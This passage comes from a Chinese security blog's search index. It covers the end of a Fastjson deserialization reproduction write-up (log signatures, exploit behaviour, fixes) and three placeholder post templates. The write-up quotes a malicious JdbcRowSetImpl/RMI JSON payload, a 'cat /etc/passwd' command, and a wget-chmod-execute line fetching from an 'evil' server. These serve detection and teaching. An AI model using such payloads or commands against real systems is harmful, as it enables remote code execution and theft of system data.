地址或地理位置，这也可以作为一个攻击特征在流量包中体现出来。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志特征</p><p><img src="/img/image-20250817175206768.png" alt="image-20250817175206768"></p><p>异常请求记录：有与正常请求不同的 POST 请求记录，请求路径可能是应用中与 Fastjson 解析相关的接口。并且请求体中包含恶意构造的 JSON 数据，例如{“b”:{“@type”:”com.sun.rowset.jdbcrowsetimpl”,”datasourcename”:”rmi:&#x2F;&#x2F;192.168.142.133:1099&#x2F;tmhawa”,”autocommit”:true}}，这是利用漏洞尝试连接远程 RMI 服务器以执行恶意代码的典型特征。</p><p>频繁请求：可能出现来自同一 IP 地址或不同 IP 地址的大量相似请求，都试图利用漏洞执行不同的恶意操作，如多次尝试连接不同的远程服务器或执行不同的命令。</p><p>系统命令执行日志：如果攻击者成功利用漏洞执行了系统命令，Docker 日志中可能会出现相应的命令执行记录以及执行结果。比如执行touch &#x2F;tmp&#x2F;test命令来创建一个测试文件，日志中可能会有类似Executing command: touch &#x2F;tmp&#x2F;test的记录，或者是执行cat &#x2F;etc&#x2F;passwd命令读取用户信息，也会有相应的记录显示。</p><p>类加载错误：由于攻击者构造的恶意 JSON 数据可能尝试加载不存在或无权限访问的类，Fastjson 在解析时可能会产生类加载错误日志。例如，日志中出现ClassNotFoundException: com.sun.rowset.jdbcrowsetimpl等类似的错误信息，提示找不到指定的类。</p><p>连接错误：当攻击者尝试连接远程 RMI 服务器时，如果服务器不存在、端口未开放或网络连接有问题，会产生连接错误日志。如java.rmi.ConnectException: Connection refused to host: 192.168.142.133; nested exception is: java.net.ConnectException: Connection refused，表明无法连接到指定的远程服务器。</p><h2 id="漏洞利用行为总结"><a href="#漏洞利用行为总结" class="headerlink" title="漏洞利用行为总结"></a>漏洞利用行为总结</h2><p>针对漏洞利用过程中的流量和服务器日志进行发现，总结漏洞利用过程中行为特征如下：<br>构造恶意 JSON 数据：攻击者会构造包含特定类和方法调用的 JSON 数据，利用 Fastjson 的反序列化机制，将 JSON 数据转换为 Java 对象时执行恶意代码。例如，利用com.sun.rowset.JdbcRowSetImpl类的特性，通过设置datasourcename属性来指定远程 RMI 服务器地址和端口，尝试连接远程服务器并执行恶意代码。</p><p>发送恶意请求：攻击者将构造好的恶意 JSON 数据通过 HTTP 请求发送到使用 Fastjson 进行 JSON 解析的目标应用程序接口。这通常是一个 POST 请求，请求体中包含恶意 JSON 数据，Content - Type 设置为application&#x2F;json。</p><p>触发反序列化漏洞：目标应用程序接收到请求后，使用 Fastjson 对请求体中的 JSON 数据进行反序列化处理。由于 Fastjson 在反序列化过程中没有对输入进行充分的验证和过滤，导致恶意代码被执行。</p><p>执行恶意代码：一旦反序列化过程被利用，攻击者可以执行任意代码，如连接远程服务器下载并执行恶意软件、读取或篡改服务器上的敏感文件、获取系统权限等。例如，攻击者可以利用漏洞执行系统命令，如cat &#x2F;etc&#x2F;passwd读取用户信息，或通过执行wget <a href="http://evil/">http://evil</a> - server &#x2F; malicious - file &amp;&amp; chmod + x malicious - file &amp;&amp;.&#x2F;malicious - file下载并执行恶意文件。</p><h2 id="🛡️-修复方案"><a href="#🛡️-修复方案" class="headerlink" title="🛡️ 修复方案"></a>🛡️ 修复方案</h2><p>升级 Fastjson 版本：将 Fastjson 升级到官方修复该漏洞的版本，建议使用 1.2.47 及以上版本。在升级前，需全面评估应用程序与新版本 Fastjson 的兼容性，可在测试环境中进行充分测试，确保升级后应用程序能正常运行。</p><p>输入验证与过滤：对接收的 JSON 数据进行严格的输入验证和过滤，阻止包含恶意类名、方法名或特定关键词的 JSON 数据进入反序列化流程。可以使用正则表达式或其他验证机制，检查 JSON 数据中的类名是否在允许的白名单内，防止非法类被反序列化。</p><p>安全配置 Fastjson：配置 Fastjson 的反序列化特性，限制反序列化的类范围，只允许特定的、信任的类进行反序列化。同时，禁用自动类型转换等可能存在风险的功能，降低漏洞被利用的可能性。例如，在使用 Fastjson 解析 JSON 数据时，通过设置ParserConfig来指定允许反序列化的类。</p><p>及时关注安全公告：关注 Fastjson 官方的安全公告和更新信息，及时了解并处理新发现的安全问题。建立安全信息收集机制，以便在出现新漏洞时能快速响应并采取相应的修复措施。</p><p>安全编码规范：开发人员应遵循安全编码规范，避免在代码中出现可被利用的安全隐患。例如，避免直接使用用户输入来构造反序列化对象，对不可信的输入进行充分的净化和验证。同时，定期进行代码审查，检查是否存在潜在的安全漏洞。</p><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><p><a href="https://www.cnblogs.com/Junglezt/p/18137413">https://www.cnblogs.com/Junglezt/p/18137413</a></p><h2 id="💡-总结与启示"><a href="#💡-总结与启示" class="headerlink" title="💡 总结与启示"></a>💡 总结与启示</h2><p>这是24年上半年复现的洞了，现在搞个博客才发，就当简单记录和复习了</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>安全研究</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web渗透技术：【技术名称】</title>
    <link href="/2023/10/18/Web%E6%B8%97%E9%80%8F%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/Web%E6%B8%97%E9%80%8F%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📝-技术概述"><a href="#📝-技术概述" class="headerlink" title="📝 技术概述"></a>📝 技术概述</h2><p>这里简要介绍该Web渗透技术的基本概念和应用场景。</p><span id="more"></span><h2 id="🔍-技术原理"><a href="#🔍-技术原理" class="headerlink" title="🔍 技术原理"></a>🔍 技术原理</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>详细解释该渗透技术的工作原理和技术基础。</p><h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>分析该技术在整个攻击链中的位置和作用。</p><h2 id="💻-实战演示"><a href="#💻-实战演示" class="headerlink" title="💻 实战演示"></a>💻 实战演示</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>测试环境搭建</li><li>所需工具</li><li>前置条件</li></ul><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>第一步：信息收集</li><li>第二步：漏洞识别</li><li>第三步：漏洞利用</li><li>第四步：权限提升</li><li>第五步：后渗透操作</li></ol><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击示例代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">web_penetration</span>():<br>    target = <span class="hljs-string">&quot;http://example.com&quot;</span><br>    <span class="hljs-comment"># 执行渗透测试步骤</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始渗透测试...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>如何检测此类攻击的发生。</p><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><ul><li>技术层面防御</li><li>管理层面防御</li><li>应急响应建议</li></ul><h2 id="📊-实际案例"><a href="#📊-实际案例" class="headerlink" title="📊 实际案例"></a>📊 实际案例</h2><table><thead><tr><th>案例</th><th>时间</th><th>影响</th><th>技术特点</th></tr></thead><tbody><tr><td>案例1</td><td>2023年</td><td>严重</td><td>特点描述</td></tr><tr><td>案例2</td><td>2022年</td><td>中等</td><td>特点描述</td></tr></tbody></table><h2 id="🔧-工具推荐"><a href="#🔧-工具推荐" class="headerlink" title="🔧 工具推荐"></a>🔧 工具推荐</h2><ul><li>工具1：<a href="https://example.com/">工具链接</a> - 简要描述</li><li>工具2：<a href="https://example.com/">工具链接</a> - 简要描述</li></ul><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://example.com/">参考链接1</a></li><li><a href="https://example.com/">参考链接2</a></li></ul><h2 id="💡-总结与思考"><a href="#💡-总结与思考" class="headerlink" title="💡 总结与思考"></a>💡 总结与思考</h2><p>对该渗透技术的总结评价和未来发展趋势的思考。</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>攻击技术</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【项目名称】- 安全工具/系统开发实践</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📋-项目概述"><a href="#📋-项目概述" class="headerlink" title="📋 项目概述"></a>📋 项目概述</h2><p>简要介绍该安全项目的基本情况，包括项目目标、解决的问题和应用场景。</p><span id="more"></span><h2 id="🎯-项目背景"><a href="#🎯-项目背景" class="headerlink" title="🎯 项目背景"></a>🎯 项目背景</h2><h3 id="项目起源"><a href="#项目起源" class="headerlink" title="项目起源"></a>项目起源</h3><p>描述项目的起源和开发动机。</p><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>详细说明该项目要解决的具体安全问题。</p><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><p>介绍项目使用的主要技术栈和选型理由。</p><h2 id="🏗️-系统架构"><a href="#🏗️-系统架构" class="headerlink" title="🏗️ 系统架构"></a>🏗️ 系统架构</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>描述系统的整体架构设计。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[架构图或流程图]</span><br></code></pre></td></tr></table></figure><h3 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h3><ul><li>模块1：功能描述</li><li>模块2：功能描述</li><li>模块3：功能描述</li></ul><h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h3><p>详细介绍项目中使用的关键技术和实现方法。</p><h2 id="💻-核心代码实现"><a href="#💻-核心代码实现" class="headerlink" title="💻 核心代码实现"></a>💻 核心代码实现</h2><h3 id="模块1实现"><a href="#模块1实现" class="headerlink" title="模块1实现"></a>模块1实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心代码示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_function</span>():<br>    <span class="hljs-comment"># 实现逻辑</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模块1功能实现&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="模块2实现"><a href="#模块2实现" class="headerlink" title="模块2实现"></a>模块2实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心代码示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">another_function</span>():<br>    <span class="hljs-comment"># 实现逻辑</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模块2功能实现&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="📊-项目效果"><a href="#📊-项目效果" class="headerlink" title="📊 项目效果"></a>📊 项目效果</h2><h3 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h3><p>描述项目的主要功能和效果。</p><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><table><thead><tr><th>指标</th><th>数值</th><th>说明</th></tr></thead><tbody><tr><td>指标1</td><td>XX</td><td>说明</td></tr><tr><td>指标2</td><td>XX</td><td>说明</td></tr><tr><td>指标3</td><td>XX</td><td>说明</td></tr></tbody></table><h3 id="实际应用案例"><a href="#实际应用案例" class="headerlink" title="实际应用案例"></a>实际应用案例</h3><p>分享项目在实际场景中的应用案例。</p><h2 id="🔧-部署指南"><a href="#🔧-部署指南" class="headerlink" title="🔧 部署指南"></a>🔧 部署指南</h2><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><ul><li>操作系统：XXX</li><li>依赖组件：XXX</li><li>硬件要求：XXX</li></ul><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol><li>第一步</li><li>第二步</li><li>第三步</li></ol><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 配置文件示例</span><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>  <br><span class="hljs-attr">security:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="🚀-使用指南"><a href="#🚀-使用指南" class="headerlink" title="🚀 使用指南"></a>🚀 使用指南</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>描述项目的基本使用方法。</p><h3 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h3><p>介绍项目的高级功能和使用技巧。</p><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><p>列出使用过程中可能遇到的常见问题和解决方法。</p><h2 id="📈-项目展望"><a href="#📈-项目展望" class="headerlink" title="📈 项目展望"></a>📈 项目展望</h2><h3 id="当前不足"><a href="#当前不足" class="headerlink" title="当前不足"></a>当前不足</h3><p>分析项目目前存在的不足和限制。</p><h3 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h3><p>介绍项目的未来发展计划和方向。</p><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://example.com/">参考资料1</a></li><li><a href="https://example.com/">参考资料2</a></li><li><a href="https://github.com/example">开源项目地址</a></li></ul><h2 id="💡-总结与心得"><a href="#💡-总结与心得" class="headerlink" title="💡 总结与心得"></a>💡 总结与心得</h2><p>分享项目开发过程中的心得体会和经验总结。</p>]]></content>
    
    
    <categories>
      
      <category>安全项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
      <tag>开发实践</tag>
      
      <tag>项目分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【漏洞编号】- 【漏洞名称】深度分析</title>
    <link href="/2023/10/18/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📢-漏洞概述"><a href="#📢-漏洞概述" class="headerlink" title="📢 漏洞概述"></a>📢 漏洞概述</h2><p>简要介绍该漏洞的基本情况，包括漏洞类型、影响范围、CVSS评分等。</p><span id="more"></span><h2 id="🔎-漏洞详情"><a href="#🔎-漏洞详情" class="headerlink" title="🔎 漏洞详情"></a>🔎 漏洞详情</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><table><thead><tr><th>项目</th><th>详情</th></tr></thead><tbody><tr><td>漏洞编号</td><td>CVE-20XX-XXXXX</td></tr><tr><td>披露时间</td><td>20XX年XX月XX日</td></tr><tr><td>影响版本</td><td>X.X.X - X.X.X</td></tr><tr><td>漏洞评级</td><td>严重&#x2F;高危&#x2F;中危&#x2F;低危</td></tr><tr><td>修复版本</td><td>X.X.X</td></tr></tbody></table><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>详细分析漏洞产生的技术原因，包括代码缺陷、设计缺陷等。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>受影响的系统</li><li>受影响的组件</li><li>受影响的用户群体</li></ul><h2 id="💻-漏洞分析"><a href="#💻-漏洞分析" class="headerlink" title="💻 漏洞分析"></a>💻 漏洞分析</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 有漏洞的代码片段</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">10</span>];<br>    gets(buffer);  <span class="hljs-comment">// 缓冲区溢出漏洞</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h3><p>详细描述触发漏洞所需的条件和环境。</p><h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>分析漏洞可能的利用方式和攻击向量。</p><h2 id="🧪-漏洞复现"><a href="#🧪-漏洞复现" class="headerlink" title="🧪 漏洞复现"></a>🧪 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>详细说明如何搭建漏洞复现环境。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><ol><li>第一步</li><li>第二步</li><li>第三步</li></ol><h3 id="漏洞利用代码"><a href="#漏洞利用代码" class="headerlink" title="漏洞利用代码"></a>漏洞利用代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 漏洞利用PoC</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit_vulnerability</span>():<br>    payload = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">20</span>  <span class="hljs-comment"># 构造溢出数据</span><br>    <span class="hljs-comment"># 发送payload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发送漏洞利用载荷...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="🛡️-修复方案"><a href="#🛡️-修复方案" class="headerlink" title="🛡️ 修复方案"></a>🛡️ 修复方案</h2><h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><p>分析官方发布的修复方案和补丁。</p><h3 id="临时缓解措施"><a href="#临时缓解措施" class="headerlink" title="临时缓解措施"></a>临时缓解措施</h3><p>在无法立即应用补丁的情况下可采取的临时措施。</p><h3 id="最佳实践建议"><a href="#最佳实践建议" class="headerlink" title="最佳实践建议"></a>最佳实践建议</h3><p>预防类似漏洞的最佳实践和安全建议。</p><h2 id="📊-时间线"><a href="#📊-时间线" class="headerlink" title="📊 时间线"></a>📊 时间线</h2><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>20XX-XX-XX</td><td>漏洞被发现</td></tr><tr><td>20XX-XX-XX</td><td>漏洞报告给厂商</td></tr><tr><td>20XX-XX-XX</td><td>厂商确认漏洞</td></tr><tr><td>20XX-XX-XX</td><td>补丁发布</td></tr><tr><td>20XX-XX-XX</td><td>漏洞公开</td></tr></tbody></table><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://cve.mitre.org/">CVE详情</a></li><li><a href="https://example.com/">厂商公告</a></li><li><a href="https://example.com/">技术分析文章</a></li></ul><h2 id="💡-总结与启示"><a href="#💡-总结与启示" class="headerlink" title="💡 总结与启示"></a>💡 总结与启示</h2><p>对该漏洞的总结评价和安全启示。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>安全研究</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
